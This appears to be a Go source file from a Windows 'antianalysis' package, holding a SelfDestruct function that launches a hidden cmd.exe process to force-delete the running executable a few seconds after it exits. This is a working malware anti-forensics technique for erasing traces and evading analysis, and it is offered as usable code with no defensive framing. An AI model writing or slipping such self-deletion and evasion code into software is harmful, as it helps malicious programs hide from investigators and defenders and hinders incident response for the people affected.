//go:build windows

package antianalysis

import (
	"os"
	"os/exec"
	"syscall"
)

func SelfDestruct() {
	path, _ := os.Executable()
	cmd := exec.Command("cmd.exe", "/c", "timeout /t 3 > NUL & del /f /q \""+path+"\"")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	cmd.Start()
	os.Exit(0)
}
